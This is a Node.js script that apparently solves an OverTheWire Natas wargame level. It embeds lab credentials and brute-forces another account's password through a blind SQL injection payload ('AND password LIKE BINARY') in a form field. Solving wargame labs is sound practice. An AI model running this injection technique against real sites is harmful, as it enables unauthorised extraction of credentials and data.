let username = 'natas15';
let password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J';


const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'); 
      rp = require('request-promise').defaults({transform : autoParse});
 
function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}

let characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    .split('');

let count = 0;
function bruteForce(currentPassword){
    if(currentPassword.length == 32)
        console.log('PASSWORD: ' + currentPassword);
    characters.forEach(char => {
        let newPassword = currentPassword + char;
        let options = {
            uri: `http://${username}.natas.labs.overthewire.org`,
            method: 'POST',
            formData: {
                username: 'natas16" AND password LIKE BINARY "' + newPassword + '%'
            }
        }
        rp(options)
            .auth(username, password)
            .then($ => {
                if($.text().includes("This user exists.")){
                    console.log('found char:' + newPassword)
                    bruteForce(newPassword);
                }
            });
    });
}

bruteForce('');
